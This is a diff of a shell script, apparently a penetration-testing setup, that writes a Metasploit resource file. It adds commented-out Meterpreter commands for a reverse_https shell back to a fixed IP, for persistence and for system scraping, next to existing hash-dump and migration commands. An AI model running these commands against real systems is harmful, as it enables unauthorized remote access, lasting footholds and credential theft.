@@ -1591,6 +1591,11 @@ cat <<EOF > "${file}"
 
 #run post/windows/manage/smart_migrate
 #run post/windows/gather/smart_hashdump
+
+#run multi_meter_inject -pt windows/meterpreter/reverse_https -mr 192.168.22.105 -p 443
+#run persistence_JBv2 -s 10.0.144.135 -l 1 -d 1.txt
+#run scraper_crowe
+
 EOF
 file=/root/.msf4/msfconsole.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
 #load sounds verbose=true
